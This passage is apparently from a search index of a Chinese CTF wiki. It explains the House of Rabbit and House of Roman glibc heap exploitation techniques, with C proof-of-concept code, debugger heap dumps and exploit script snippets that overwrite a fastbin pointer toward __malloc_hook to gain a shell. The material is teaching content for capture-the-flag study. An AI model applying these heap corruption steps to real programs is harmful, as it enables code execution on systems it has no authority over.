orange\u7684\u8981\u70b9\u6b63\u5728\u4e8e\u6b64\uff0c\u4e4b\u540e\u7684\u5229\u7528\u56e0\u4e3a\u6d89\u53ca\u5230_IO_FILE\u7684\u77e5\u8bc6\uff0c\u653e\u5230IO_FILE\u72ec\u7acb\u7ae0\u8282\u5206\u4eab\u3002", 
            "title": "\u6b63\u786e\u7684\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/heap/house_of_rabbit/", 
            "text": "House of Rabbit\n\n\n\u4ecb\u7ecd\n\n\nHouse of rabbit\u662f\u4e00\u79cd\u4f2a\u9020\u5806\u5757\u7684\u6280\u672f\uff0c\u65e9\u57282017\u5e74\u5df2\u7ecf\u63d0\u51fa\uff0c\u4f46\u5728\u6700\u8fd1\u4e24\u4e2a\u6708\u624d\u5728CTF\u6bd4\u8d5b\u4e2d\u51fa\u73b0\u3002\u6211\u4eec\u4e00\u822c\u8fd0\u7528\u5728fastbin attack\u4e2d\uff0c\u56e0\u4e3aunsorted bin\u7b49\u5176\u5b83\u7684bin\u6709\u66f4\u597d\u7684\u5229\u7528\u624b\u6bb5\u3002\n\n\n\u539f\u7406\n\n\n\u6211\u4eec\u77e5\u9053\uff0cfastbin\u4e2d\u4f1a\u628a\u76f8\u540c\u7684size\u7684\u88ab\u91ca\u653e\u7684\u5806\u5757\u7528\u4e00\u4e2a\u5355\u5411\u94fe\u8868\u7ba1\u7406\uff0c\u5206\u914d\u7684\u65f6\u5019\u4f1a\u68c0\u67e5size\u662f\u5426\u5408\u7406\uff0c\u5982\u679c\u4e0d\u5408\u7406\u7a0b\u5e8f\u5c31\u4f1a\u5f02\u5e38\u9000\u51fa\u3002\u800chouse of rabbit\u5c31\u5229\u7528\u4e86\u5728malloc consolidate\u7684\u65f6\u5019fastbin\u4e2d\u7684\u5806\u5757\u8fdb\u884c\u5408\u5e76\u65f6size\u6ca1\u6709\u8fdb\u884c\u68c0\u67e5\u4ece\u800c\u4f2a\u9020\u4e00\u4e2a\u5047\u7684\u5806\u5757\uff0c\u4e3a\u8fdb\u4e00\u6b65\u7684\u5229\u7528\u505a\u51c6\u5907\u3002\n\n\n\u7531\u4e8e\u539f\u4f5c\u8005\u7684\nPOC\n\u9700\u8981\u7684\u6761\u4ef6\u8f83\u591a\uff0c\u8fd9\u91cc\u6211\u76f4\u63a5\u4ecb\u7ecd\u8fd9\u4e2a\u653b\u51fb\u7684\u672c\u8d28\u5373\u53ef\u3002\n\n\n\u524d\u63d0\u6761\u4ef6\n:\n1. \u53ef\u4ee5\u4fee\u6539fastbin\u7684fd\u6307\u9488\u6216size\n2. \u53ef\u4ee5\u89e6\u53d1malloc consolidate(merge top\u6216malloc big chunk\u7b49\u7b49)\n\n\n\u4e0b\u9762\u6765\u770b\u4e00\u4e0bPOC\n\nPOC 1\n: modify the size of fastbin chunk\n\nunsigned\n \nlong\n*\n \nchunk1\n=\nmalloc\n(\n0x40\n);\n \n//0x602000\n\n\nunsigned\n \nlong\n*\n \nchunk2\n=\nmalloc\n(\n0x40\n);\n \n//0x602050\n\n\nmalloc\n(\n0x10\n);\n\n\nfree\n(\nchunk1\n);\n\n\nfree\n(\nchunk2\n);\n\n\n/* Heap layout\n\n\n0000| 0x602000 --\n 0x0 \n\n\n0008| 0x602008 --\n 0x51 (\nQ\n)\n\n\n0016| 0x602010 --\n 0x0 \n\n\n..... \n\n\n0080| 0x602050 --\n 0x0 \n\n\n0088| 0x602058 --\n 0x51 (\nQ\n)\n\n\n0096| 0x602060 --\n 0x602000 --\n 0x0 \n\n\n0104| 0x602068 --\n 0x0 \n\n\n...... \n\n\n0160| 0x6020a0 --\n 0x0 \n\n\n0168| 0x6020a8 --\n 0x21 (\n!\n)\n\n\n0176| 0x6020b0 --\n 0x0 \n\n\n0184| 0x6020b8 --\n 0x0 \n\n\n*/\n\n\nchunk1\n[\n-\n1\n]\n=\n0xa1\n;\n \n//modify chunk1 size to be 0xa1\n\n\nmalloc\n(\n0x1000\n);\n  \n//allocate a large chunk, trigger malloc consolidate\n\n\n/*Chunk1 overlap with chunk2 now\n\n\ngdb-peda$ telescope 0x602000 100\n\n\n0000| 0x602000 --\n 0x0 \n\n\n0008| 0x602008 --\n 0xa1 \n\n\n0016| 0x602010 --\n 0x7ffff7dd1c08 --\n 0x7ffff7dd1bf8 --\n 0x7ffff7dd1be8 --\n 0x7ffff7dd1bd8 --\n 0x7ffff7dd1bc8 (--\n ...)\n\n\n0024| 0x602018 --\n 0x7ffff7dd1c08 --\n 0x7ffff7dd1bf8 --\n 0x7ffff7dd1be8 --\n 0x7ffff7dd1bd8 --\n 0x7ffff7dd1bc8 (--\n ...)\n\n\n0032| 0x602020 --\n 0x0 \n\n\n.....\n\n\n0080| 0x602050 --\n 0x0 \n\n\n0088| 0x602058 --\n 0x51 (\nQ\n)\n\n\n0096| 0x602060 --\n 0x7ffff7dd1bb8 --\n 0x7ffff7dd1ba8 --\n 0x7ffff7dd1b98 --\n 0x7ffff7dd1b88 --\n 0x7ffff7dd1b78 (--\n ...)\n\n\n0104| 0x602068 --\n 0x7ffff7dd1bb8 --\n 0x7ffff7dd1ba8 --\n 0x7ffff7dd1b98 --\n 0x7ffff7dd1b88 --\n 0x7ffff7dd1b78 (--\n ...)\n\n\n0112| 0x602070 --\n 0x0 \n\n\n0120| 0x602078 --\n 0x0 \n\n\n....\n\n\n0152| 0x602098 --\n 0x0 \n\n\n0160| 0x6020a0 --\n 0xa0 \n\n\n0168| 0x6020a8 --\n 0x20 (\n \n)\n\n\n\ngdb-peda$ heapinfo\n\n\n(0x20)     fastbin[0]: 0x0\n\n\n(0x30)     fastbin[1]: 0x0\n\n\n(0x40)     fastbin[2]: 0x0\n\n\n(0x50)     fastbin[3]: 0x0\n\n\n(0x60)     fastbin[4]: 0x0\n\n\n(0x70)     fastbin[5]: 0x0\n\n\n(0x80)     fastbin[6]: 0x0\n\n\n                  top: 0x603450 (size : 0x1fbb0) \n\n\n       last_remainder: 0x0 (size : 0x0) \n\n\n            unsortbin: 0x0\n\n\n(0x050)  smallbin[ 3]: 0x602050\n\n\n(0x0a0)  smallbin[ 8]: 0x602000 (overlap chunk with 0x602050(freed) )\n\n\n*/\n\n\n\n\nPOC 2\n:modify FD pointer\n\nunsigned\n \nlong\n*\n \nchunk1\n=\nmalloc\n(\n0x40\n);\n \n//0x602000\n\n\nunsigned\n \nlong\n*\n \nchunk2\n=\nmalloc\n(\n0x100\n);\n//0x602050\n\n\n\nchunk2\n[\n1\n]\n=\n0x31\n;\n \n//fake chunk size 0x30\n\n\nchunk2\n[\n7\n]\n=\n0x21\n  \n//fake chunk\ns next chunk\n\n\nchunk2\n[\n11\n]\n=\n0x21\n \n//fake chunk\ns next chunk\ns next chuck\n\n\n/* Heap laylout\n\n\n0000| 0x602000 --\n 0x0 \n\n\n0008| 0x602008 --\n 0x51 (\nQ\n)\n\n\n0016| 0x602010 --\n 0x0 \n\n\n......\n\n\n0080| 0x602050 --\n 0x0 \n\n\n0088| 0x602058 --\n 0x111 \n\n\n0096| 0x602060 --\n 0x0 \n\n\n0104| 0x602068 --\n 0x31 (\n1\n)\n\n\n0112| 0x602070 --\n 0x0 \n\n\n......\n\n\n0144| 0x602090 --\n 0x0 \n\n\n0152| 0x602098 --\n 0x21 (\n!\n)\n\n\n0160| 0x6020a0 --\n 0x0 \n\n\n0168| 0x6020a8 --\n 0x0 \n\n\n0176| 0x6020b0 --\n 0x0 \n\n\n0184| 0x6020b8 --\n 0x21 (\n!\n)\n\n\n0192| 0x6020c0 --\n 0x0 \n\n\n......\n\n\n0352| 0x602160 --\n 0x0 \n\n\n0360| 0x602168 --\n 0x20ea1\n\n\n*/\n\n\nfree\n(\nchunk1\n);\n\n\nchuck1\n[\n0\n]\n=\n0x602060\n;\n// modify the fd of chunk1\n\n\n/*\n\n\ngdb-peda$ heapinfo\n\n\n(0x20)     fastbin[0]: 0x0\n\n\n(0x30)     fastbin[1]: 0x0\n\n\n(0x40)     fastbin[2]: 0x0\n\n\n(0x50)     fastbin[3]: 0x602000 --\n 0x602060 (size error (0x30)) --\n 0x0\n\n\n*/\n\n\nmalloc\n(\n5000\n);\n// malloc a  big chunk to trigger malloc consolidate\n\n\n/*\n\n\ngdb-peda$ heapinfo\n\n\n(0x20)     fastbin[0]: 0x0\n\n\n(0x30)     fastbin[1]: 0x0\n\n\n(0x40)     fastbin[2]: 0x0\n\n\n(0x50)     fastbin[3]: 0x0\n\n\n(0x60)     fastbin[4]: 0x0\n\n\n(0x70)     fastbin[5]: 0x0\n\n\n(0x80)     fastbin[6]: 0x0\n\n\n                  top: 0x6034f0 (size : 0x1fb10) \n\n\n       last_remainder: 0x0 (size : 0x0) \n\n\n            unsortbin: 0x0\n\n\n(0x050)  smallbin[ 3]: 0x602000\n\n\n(0x030)  smallbin[ 1]: 0x602060\n\n\n*/\n\n\n\n\n\u539f\u7406\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u901a\u8fc7\u4fee\u6539fastbin chunk\u7684size(\u5982\u4e0a\u9762\u7684POC 1\u6240\u793a)\u76f4\u63a5\u6784\u9020overlap chunk\uff0c\u6216\u8005\u4fee\u6539fd(\u5982\u9762\u7684POC 2\u6240\u793a)\uff0c\u8ba9\u5b83\u6307\u5411\u4e00\u4e2afake chunk\uff0c\u89e6\u53d1malloc consolidate\u4e4b\u540e\u8ba9\u8fd9\u4e2afake chunk\u6210\u4e3a\u4e00\u4e2a\u5408\u6cd5\u7684chunk\u3002\n\n\n\u603b\u7ed3\n\n\nHouse of rabbit\u7684\u4f18\u70b9\u662f\u5bb9\u6613\u6784\u9020overlap chunk\uff0c\u7531\u4e8e\u53ef\u4ee5\u57fa\u4e8efastbin attack\uff0c\u751a\u81f3\u4e0d\u9700\u8981leak\u5c31\u53ef\u4ee5\u5b8c\u6210\u653b\u51fb\u3002\u5927\u5bb6\u53ef\u4ee5\u901a\u8fc7\u4f8b\u9898\u7684\u7ec3\u4e60\u52a0\u6df1\u5bf9\u8fd9\u4e2a\u653b\u51fb\u7684\u7406\u89e3\u3002\n\n\n\u4f8b\u9898\n\n\n\n\nHITB-GSEC-XCTF 2018 mutepig\n\n\n\u5f85\u8865\u5145", 
            "title": "House of Rabbit"
        }, 
        {
            "location": "/pwn/heap/house_of_rabbit/#house-of-rabbit", 
            "text": "", 
            "title": "House of Rabbit"
        }, 
        {
            "location": "/pwn/heap/house_of_rabbit/#_1", 
            "text": "House of rabbit\u662f\u4e00\u79cd\u4f2a\u9020\u5806\u5757\u7684\u6280\u672f\uff0c\u65e9\u57282017\u5e74\u5df2\u7ecf\u63d0\u51fa\uff0c\u4f46\u5728\u6700\u8fd1\u4e24\u4e2a\u6708\u624d\u5728CTF\u6bd4\u8d5b\u4e2d\u51fa\u73b0\u3002\u6211\u4eec\u4e00\u822c\u8fd0\u7528\u5728fastbin attack\u4e2d\uff0c\u56e0\u4e3aunsorted bin\u7b49\u5176\u5b83\u7684bin\u6709\u66f4\u597d\u7684\u5229\u7528\u624b\u6bb5\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/house_of_rabbit/#_2", 
            "text": "\u6211\u4eec\u77e5\u9053\uff0cfastbin\u4e2d\u4f1a\u628a\u76f8\u540c\u7684size\u7684\u88ab\u91ca\u653e\u7684\u5806\u5757\u7528\u4e00\u4e2a\u5355\u5411\u94fe\u8868\u7ba1\u7406\uff0c\u5206\u914d\u7684\u65f6\u5019\u4f1a\u68c0\u67e5size\u662f\u5426\u5408\u7406\uff0c\u5982\u679c\u4e0d\u5408\u7406\u7a0b\u5e8f\u5c31\u4f1a\u5f02\u5e38\u9000\u51fa\u3002\u800chouse of rabbit\u5c31\u5229\u7528\u4e86\u5728malloc consolidate\u7684\u65f6\u5019fastbin\u4e2d\u7684\u5806\u5757\u8fdb\u884c\u5408\u5e76\u65f6size\u6ca1\u6709\u8fdb\u884c\u68c0\u67e5\u4ece\u800c\u4f2a\u9020\u4e00\u4e2a\u5047\u7684\u5806\u5757\uff0c\u4e3a\u8fdb\u4e00\u6b65\u7684\u5229\u7528\u505a\u51c6\u5907\u3002  \u7531\u4e8e\u539f\u4f5c\u8005\u7684 POC \u9700\u8981\u7684\u6761\u4ef6\u8f83\u591a\uff0c\u8fd9\u91cc\u6211\u76f4\u63a5\u4ecb\u7ecd\u8fd9\u4e2a\u653b\u51fb\u7684\u672c\u8d28\u5373\u53ef\u3002  \u524d\u63d0\u6761\u4ef6 :\n1. \u53ef\u4ee5\u4fee\u6539fastbin\u7684fd\u6307\u9488\u6216size\n2. \u53ef\u4ee5\u89e6\u53d1malloc consolidate(merge top\u6216malloc big chunk\u7b49\u7b49)  \u4e0b\u9762\u6765\u770b\u4e00\u4e0bPOC POC 1 : modify the size of fastbin chunk unsigned   long *   chunk1 = malloc ( 0x40 );   //0x602000  unsigned   long *   chunk2 = malloc ( 0x40 );   //0x602050  malloc ( 0x10 );  free ( chunk1 );  free ( chunk2 );  /* Heap layout  0000| 0x602000 --  0x0   0008| 0x602008 --  0x51 ( Q )  0016| 0x602010 --  0x0   .....   0080| 0x602050 --  0x0   0088| 0x602058 --  0x51 ( Q )  0096| 0x602060 --  0x602000 --  0x0   0104| 0x602068 --  0x0   ......   0160| 0x6020a0 --  0x0   0168| 0x6020a8 --  0x21 ( ! )  0176| 0x6020b0 --  0x0   0184| 0x6020b8 --  0x0   */  chunk1 [ - 1 ] = 0xa1 ;   //modify chunk1 size to be 0xa1  malloc ( 0x1000 );    //allocate a large chunk, trigger malloc consolidate  /*Chunk1 overlap with chunk2 now  gdb-peda$ telescope 0x602000 100  0000| 0x602000 --  0x0   0008| 0x602008 --  0xa1   0016| 0x602010 --  0x7ffff7dd1c08 --  0x7ffff7dd1bf8 --  0x7ffff7dd1be8 --  0x7ffff7dd1bd8 --  0x7ffff7dd1bc8 (--  ...)  0024| 0x602018 --  0x7ffff7dd1c08 --  0x7ffff7dd1bf8 --  0x7ffff7dd1be8 --  0x7ffff7dd1bd8 --  0x7ffff7dd1bc8 (--  ...)  0032| 0x602020 --  0x0   .....  0080| 0x602050 --  0x0   0088| 0x602058 --  0x51 ( Q )  0096| 0x602060 --  0x7ffff7dd1bb8 --  0x7ffff7dd1ba8 --  0x7ffff7dd1b98 --  0x7ffff7dd1b88 --  0x7ffff7dd1b78 (--  ...)  0104| 0x602068 --  0x7ffff7dd1bb8 --  0x7ffff7dd1ba8 --  0x7ffff7dd1b98 --  0x7ffff7dd1b88 --  0x7ffff7dd1b78 (--  ...)  0112| 0x602070 --  0x0   0120| 0x602078 --  0x0   ....  0152| 0x602098 --  0x0   0160| 0x6020a0 --  0xa0   0168| 0x6020a8 --  0x20 (   )  gdb-peda$ heapinfo  (0x20)     fastbin[0]: 0x0  (0x30)     fastbin[1]: 0x0  (0x40)     fastbin[2]: 0x0  (0x50)     fastbin[3]: 0x0  (0x60)     fastbin[4]: 0x0  (0x70)     fastbin[5]: 0x0  (0x80)     fastbin[6]: 0x0                    top: 0x603450 (size : 0x1fbb0)          last_remainder: 0x0 (size : 0x0)               unsortbin: 0x0  (0x050)  smallbin[ 3]: 0x602050  (0x0a0)  smallbin[ 8]: 0x602000 (overlap chunk with 0x602050(freed) )  */   POC 2 :modify FD pointer unsigned   long *   chunk1 = malloc ( 0x40 );   //0x602000  unsigned   long *   chunk2 = malloc ( 0x100 ); //0x602050  chunk2 [ 1 ] = 0x31 ;   //fake chunk size 0x30  chunk2 [ 7 ] = 0x21    //fake chunk s next chunk  chunk2 [ 11 ] = 0x21   //fake chunk s next chunk s next chuck  /* Heap laylout  0000| 0x602000 --  0x0   0008| 0x602008 --  0x51 ( Q )  0016| 0x602010 --  0x0   ......  0080| 0x602050 --  0x0   0088| 0x602058 --  0x111   0096| 0x602060 --  0x0   0104| 0x602068 --  0x31 ( 1 )  0112| 0x602070 --  0x0   ......  0144| 0x602090 --  0x0   0152| 0x602098 --  0x21 ( ! )  0160| 0x6020a0 --  0x0   0168| 0x6020a8 --  0x0   0176| 0x6020b0 --  0x0   0184| 0x6020b8 --  0x21 ( ! )  0192| 0x6020c0 --  0x0   ......  0352| 0x602160 --  0x0   0360| 0x602168 --  0x20ea1  */  free ( chunk1 );  chuck1 [ 0 ] = 0x602060 ; // modify the fd of chunk1  /*  gdb-peda$ heapinfo  (0x20)     fastbin[0]: 0x0  (0x30)     fastbin[1]: 0x0  (0x40)     fastbin[2]: 0x0  (0x50)     fastbin[3]: 0x602000 --  0x602060 (size error (0x30)) --  0x0  */  malloc ( 5000 ); // malloc a  big chunk to trigger malloc consolidate  /*  gdb-peda$ heapinfo  (0x20)     fastbin[0]: 0x0  (0x30)     fastbin[1]: 0x0  (0x40)     fastbin[2]: 0x0  (0x50)     fastbin[3]: 0x0  (0x60)     fastbin[4]: 0x0  (0x70)     fastbin[5]: 0x0  (0x80)     fastbin[6]: 0x0                    top: 0x6034f0 (size : 0x1fb10)          last_remainder: 0x0 (size : 0x0)               unsortbin: 0x0  (0x050)  smallbin[ 3]: 0x602000  (0x030)  smallbin[ 1]: 0x602060  */   \u539f\u7406\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u901a\u8fc7\u4fee\u6539fastbin chunk\u7684size(\u5982\u4e0a\u9762\u7684POC 1\u6240\u793a)\u76f4\u63a5\u6784\u9020overlap chunk\uff0c\u6216\u8005\u4fee\u6539fd(\u5982\u9762\u7684POC 2\u6240\u793a)\uff0c\u8ba9\u5b83\u6307\u5411\u4e00\u4e2afake chunk\uff0c\u89e6\u53d1malloc consolidate\u4e4b\u540e\u8ba9\u8fd9\u4e2afake chunk\u6210\u4e3a\u4e00\u4e2a\u5408\u6cd5\u7684chunk\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/house_of_rabbit/#_3", 
            "text": "House of rabbit\u7684\u4f18\u70b9\u662f\u5bb9\u6613\u6784\u9020overlap chunk\uff0c\u7531\u4e8e\u53ef\u4ee5\u57fa\u4e8efastbin attack\uff0c\u751a\u81f3\u4e0d\u9700\u8981leak\u5c31\u53ef\u4ee5\u5b8c\u6210\u653b\u51fb\u3002\u5927\u5bb6\u53ef\u4ee5\u901a\u8fc7\u4f8b\u9898\u7684\u7ec3\u4e60\u52a0\u6df1\u5bf9\u8fd9\u4e2a\u653b\u51fb\u7684\u7406\u89e3\u3002", 
            "title": "\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/heap/house_of_rabbit/#_4", 
            "text": "HITB-GSEC-XCTF 2018 mutepig  \u5f85\u8865\u5145", 
            "title": "\u4f8b\u9898"
        }, 
        {
            "location": "/pwn/heap/house_of_roman/", 
            "text": "House of Roman\n\n\n\u4ecb\u7ecd\n\n\nHouse of Roman \u8fd9\u4e2a\u6280\u5de7\u8bf4\u7b80\u5355\u70b9\u5176\u5b9e\u5c31\u662f fastbin attack \u548c Unsortbin attachk \u7ed3\u5408\u7684\u4e00\u4e2a\u5c0f trick\u3002\n\n\n\u6982\u62ec\n\n\n\u8be5\u6280\u672f\u7528\u4e8e bypass ALSR\uff0c\u5229\u752812-bit \u7684\u7206\u7834\u6765\u8fbe\u5230\u83b7\u53d6shell\u7684\u76ee\u7684\u3002\u4e14\u4ec5\u4ec5\u53ea\u9700\u8981\u4e00\u4e2a UAF \u6f0f\u6d1e\u4ee5\u53ca\u80fd\u521b\u5efa\u4efb\u610f\u5927\u5c0f\u7684 chunk \u7684\u60c5\u51b5\u4e0b\u5c31\u80fd\u5b8c\u6210\u5229\u7528\u3002\n\n\n\u539f\u7406\u4ee5\u53ca\u5c55\u793a\n\n\n\u4f5c\u8005\u63d0\u4f9b\u7ed9\u4e86\u6211\u4eec\u4e00\u4e2a demo \u7528\u4e8e\u5c55\u793a\uff0c\u6574\u4e2a\u5229\u7528\u8fc7\u7a0b\u5927\u6982\u53ef\u4ee5\u5206\u4e3a\u4e09\u6b65\u9aa4\u3002\n\n\n\n\n\u5c06 FD \u6307\u5411 malloc_hook\n\n\n\u4fee\u6b63 0x71 \u7684 Freelist\n\n\n\u5f80 malloc_hook \u5199\u5165 one gadget\n\n\n\n\n\u5148\u5bf9 demo \u8fdb\u884c\u4e00\u4e2a\u5927\u81f4\u7684\u5206\u6790\uff1a\n\n\n\u5f00\u542f\u7684\u4fdd\u62a4\u60c5\u51b5\uff1a\n\n\n[\n*\n]\n \n/media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall\n\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n\n\n\n\n\u6837\u9898\u4e2d\u6709\u4e09\u4e2a\u4e3b\u8981\u529f\u80fd\uff0cMalloc \uff0cWrite\uff0c\u4ee5\u53ca Free\u3002\n\n\n    \nswitch\n \n(\n \nv4\n \n)\n\n    \n{\n\n      \ncase\n \n1\n:\n\n        \nputs\n(\nMalloc\n);\n\n        \nv5\n \n=\n \nmalloc_chunk\n(\nMalloc\n);\n\n        \nif\n \n(\n \n!\nv5\n \n)\n\n          \nputs\n(\nError\n);\n\n        \nbreak\n;\n\n      \ncase\n \n2\n:\n\n        \nputs\n(\nWrite\n);\n\n        \nwrite_chunk\n(\nWrite\n);\n\n        \nbreak\n;\n\n      \ncase\n \n3\n:\n\n        \nputs\n(\nFree\n);\n\n        \nfree_chunk\n();\n\n        \nbreak\n;\n\n      \ndefault\n:\n\n        \nputs\n(\nInvalid choice\n);\n\n        \nbreak\n;\n\n\n\n\n\n\u5728 Free \u529f\u80fd\u4e2d\u5b58\u5728 \u6307\u9488\u672a\u7f6e\u96f6\u800c\u9020\u6210\u7684\u60ac\u6302\u6307\u9488\u3002\n\n\nvoid\n \nfree_chunk\n()\n\n\n{\n\n  \nunsigned\n \nint\n \nv0\n;\n \n// [rsp+Ch] [rbp-4h]@1\n\n\n  \nprintf\n(\n\\n\nEnter index :\n);\n\n  \n__isoc99_scanf\n(\n%d\n,\n \nv0\n);\n\n  \nif\n \n(\n \nv0\n \n=\n \n0x13\n \n)\n\n    \nfree\n(\nheap_ptrs\n[(\nunsigned\n \n__int64\n)\nv0\n]);\n\n\n}\n\n\n\n\n\n\u7b2c\u4e00\u6b65\n\n\n\u9996\u5148\u4f2a\u9020\u4e00\u4e2a chunk  \uff0cchunk\u7684\u5927\u5c0f\u4e3a0x61\u3002\u7d27\u63a5\u7740\u6211\u4eec\u5229\u7528 partial overwrite \u5c06 FD \u6307\u5411\u4f2a\u9020\u7684chunk\uff08\u5f53\u7136\uff0c\u8fd9\u91cc\u6211\u4eec\u4e5f\u53ef\u4ee5\u7528 UAF \u5b8c\u6210\uff09\u3002\n\n\n\u4f2a\u9020 chunk size\n\n\npwndbg\n\n0x555555757050: 0x41414141      0x41414141      0x41414141      0x41414141\n0x555555757060: 0x41414141      0x41414141      0x41414141      0x41414141\n0x555555757070: 0x41414141      0x41414141      0x41414141      0x41414141\n0x555555757080: 0x41414141      0x41414141      0x41414141      0x41414141\n0x555555757090: 0x41414141      0x41414141      0x61    0x0     \n----------\n\n\n\n\n\u8fd9\u91cc\uff0c\u6211\u4eec free \u6389 chunk 1\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u80fd\u83b7\u5f97\u4e00\u4e2a unsortbin\n\n\n0x555555757020 PREV_INUSE {\n  prev_size = 0x0,\n  size = 0xd1,\n  fd = 0x7ffff7dd1b58 \nmain_arena+88\n,\n  bk = 0x7ffff7dd1b58 \nmain_arena+88\n,\n  fd_nextsize = 0x4141414141414141,\n  bk_nextsize = 0x4141414141414141\n}\n\n\n\n\n\u63a5\u7740\uff0c\u6211\u4eec\u91cd\u5206\u914d 0xd1 \u8fd9\u5757 chunk\uff0c\u4ee5\u53ca\u4fee\u6539\u5176 size \u4e3a0x71\n\n\npwndbg\n x/40ag 0x555555757020\n0x555555757020: 0x4141414141414141      0x71\n0x555555757030: 0x7ffff7dd1b58 \nmain_arena+88\n  0x7ffff7dd1b58 \nmain_arena+88\n\n0x555555757040: 0x4141414141414141      0x4141414141414141\n0x555555757050: 0x4141414141414141      0x4141414141414141\n0x555555757060: 0x4141414141414141      0x4141414141414141\n0x555555757070: 0x4141414141414141      0x4141414141414141\n0x555555757080: 0x4141414141414141      0x4141414141414141\n0x555555757090: 0x4141414141414141      0x61\n\n\n\n\n\u6211\u4eec\u7d27\u63a5\u7740\u9700\u8981\u4fee\u6b63\u8fd90x71 FD freelist \uff0c\u5c06\u5176\u4f2a\u9020\u6210\u5df2\u7ecf\u91ca\u653e\u7684\u5757\n\n\npwndbg\n x/40ag 0x555555757000\n0x555555757000: 0x0     0x21\n0x555555757010: 0x4141414141414141      0x4141414141414141\n0x555555757020: 0x4141414141414141      0x71       \n----------  free 0x71\n0x555555757030: 0x7ffff7dd1b58 \nmain_arena+88\n  0x7ffff7dd1b58 \nmain_arena+88\n\n0x555555757040: 0x4141414141414141      0x4141414141414141\n0x555555757050: 0x4141414141414141      0x4141414141414141\n0x555555757060: 0x4141414141414141      0x4141414141414141\n0x555555757070: 0x4141414141414141      0x4141414141414141\n0x555555757080: 0x4141414141414141      0x4141414141414141\n0x555555757090: 0x4141414141414141      0x61\n0x5555557570a0: 0x0     0x0\n0x5555557570b0: 0x0     0x0\n0x5555557570c0: 0x0     0x0\n0x5555557570d0: 0x0     0x0\n0x5555557570e0: 0x0     0x0\n0x5555557570f0: 0xd0    0x71   \n----------     free 0x71\n0x555555757100: 0x0     0x0\n0x555555757110: 0x0     0x0\n0x555555757120: 0x0     0x0\n0x555555757130: 0x0     0x0\n\n\n\n\nlibc : 0x7ffff7a23d28 (\nmalloc_hook\n)\n\n\n\n\n\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u7684 FD \u5df2\u7ecf\u5728 malloc hook \u9644\u8fd1\uff0c\u672a\u4e4b\u540e\u7684\u7206\u7834\u505a\u51c6\u5907\u3002\n\n\n\u7b2c\u4e8c\u6b65\n\n\n\u6211\u4eec\u53ea\u9700\u8981\u901a\u8fc7 \u91ca\u653e\u4e00\u57570x71\u5927\u5c0f\u7684 chunk \u5c31\u80fd\u5b8c\u6210 fix\u3002\n\n\n\u7b2c\u4e09\u6b65\n\n\n\u5229\u7528 unsortebin \u7684\u653b\u51fb\u6280\u5de7\uff0c\u5e76\u4f7f\u7528\u7f16\u8f91\u529f\u80fd\u5c06 onegadet \u5199\u5165    \u3002\n\n\n\u5206\u6790 exp\n\n\n\u5206\u914d \n3\n \u4e2a \nchunk\n \uff0c\u5728 \nB + 0x78\n \u5904\u8bbe\u7f6e \np64(0x61)\n \uff0c \u4f5c\u7528\u662f \nfake size\n ,\u7528\u4e8e\u540e\u9762 \u7684 \nfastbin attack\n\n\ncreate\n(\n0x18\n,\n0\n)\n \n# 0x20\n\n\ncreate\n(\n0xc8\n,\n1\n)\n \n# d0\n\n\ncreate\n(\n0x65\n,\n2\n)\n  \n# 0x70\n\n\n\ninfo\n(\ncreate 2 chunk, 0x20, 0xd8\n)\n\n\nfake\n \n=\n \nA\n*\n0x68\n\n\nfake\n \n+=\n \np64\n(\n0x61\n)\n  \n## fake size\n\n\nedit\n(\n1\n,\nfake\n)\n\n\ninfo\n(\nfake\n)\n\n\n\n\n\n\u91ca\u653e\u6389 \nB\n , \u7136\u540e\u5206\u914d\u540c\u6837\u5927\u5c0f\u518d\u6b21\u5206\u914d\u5230 \nB\n , \u6b64\u65f6 \nB+0x10\n \u548c \nB+0x18\n \u4e2d\u6709 \nmain_arean\n \u7684\u5730\u5740\u3002\u5206\u914d \n3\n \u4e2a \nfastbin\n \uff0c\u5229\u7528 \noff by one\n \u4fee\u6539 \nB-\nsize = 0x71\n\n\nfree(1)\ncreate(0xc8,1)\n\ncreate(0x65,3)  # b\ncreate(0x65,15)\ncreate(0x65,18)\n\nover = \nA\n*0x18  # off by one\nover += \n\\x71\n  # set chunk  1\ns size --\n 0x71\nedit(0,over)\ninfo(\n\u5229\u7528 off by one ,  chunk  1\ns size --\n 0x71\n)\n\n\n\n\n\u751f\u6210\u4e24\u4e2a \nfastbin\n \uff0c\u7136\u540e\u5229\u7528 \nuaf\n \uff0c\u90e8\u5206\u5730\u5740\u5199\uff0c\u628a \nB\n \u94fe\u5165\u5230 \nfastbin\n\n\nfree\n(\n2\n)\n\n\nfree\n(\n3\n)\n\n\ninfo\n(\n\u521b\u5efa\u4e24\u4e2a 0x70 \u7684 fastbin\n)\n\n\nheap_po\n \n=\n \n\\x20\n\n\nedit\n(\n3\n,\nheap_po\n)\n\n\ninfo\n(\n\u628a chunk\n1 \u94fe\u5165\u5230 fastbin \u91cc\u9762\n)\n\n\n\n\n\n\u8c03\u8bd5\u770b\u770b\u6b64\u65f6 \nfastbin\n \u7684\u72b6\u6001\n\n\npwndbg\n fastbins \nfastbins\n0x20: 0x0\n0x30: 0x0\n0x40: 0x0\n0x50: 0x0\n0x60: 0x0\n0x70: 0x555555757160 \u2014\u25b8 0x555555757020 \u2014\u25b8 0x7ffff7dd1b78 (main_arena+88) \u25c2\u2014 0x7ffff7dd1b78\n0x80: 0x0\n\n\n\n\n\n\n0x555555757020\n \u5c31\u662f \nchunk B\n\n\n\n\n\u7136\u540e\u901a\u8fc7\u4fee\u6539 \nB-\nfd\n \u7684\u4f4e \n2\n \u5b57\u8282\uff0c \u4f7f\u5f97 \nB-\nfd= malloc_hook - 0x23\n\n\n# malloc_hook \u4e0a\u65b9\nmalloc_hook_nearly = \n\\xed\\x1a\n\nedit(1,malloc_hook_nearly)\ninfo(\n\u90e8\u5206\u5199\uff0c\u4fee\u6539 fastbin-\nfd ---\n malloc_hook\n)\n\n\n\n\n\u7136\u540e\u5206\u914d \n3\n \u4e2a \n0x70\n \u7684 \nchunk\n 